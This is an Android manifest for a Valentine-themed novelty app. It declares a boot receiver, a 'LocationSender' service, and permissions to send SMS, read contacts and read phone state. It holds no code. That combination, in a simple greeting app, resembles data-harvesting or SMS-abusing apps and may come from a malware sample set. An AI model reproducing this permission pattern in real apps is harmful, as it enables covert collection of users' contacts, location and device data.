<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="iconosys.valentine.esp">
    <application android:icon="@drawable/icon" android:label="@string/app_name" android:theme="@android:style/Theme.NoTitleBar">
        <activity android:label="@string/app_name" android:name=".ValentineMain" android:screenOrientation="portrait">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <receiver android:name=".BootReceiver">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:name="ValentineSvc"/>
        <activity android:name="MyValentine" android:screenOrientation="portrait"/>
        <activity android:name="OtherApps" android:screenOrientation="portrait"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name=".ItemDialog" android:screenOrientation="portrait" android:theme="@android:style/Theme.Dialog"/>
        <activity android:name="MyKissHugs" android:screenOrientation="portrait"/>
        <service android:name="TickSvc"/>
        <activity android:configChanges="keyboardHidden|orientation" android:name="ShowTerms" android:screenOrientation="portrait" android:theme="@android:style/Theme.Dialog"/>
        <service android:name="LocationSender"/>
        <activity android:name="RegistrationScreen" android:screenOrientation="portrait"/>
        <activity android:name="SweetHeart" android:screenOrientation="portrait"/>
    </application>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FLASHLIGHT"/>
</manifest>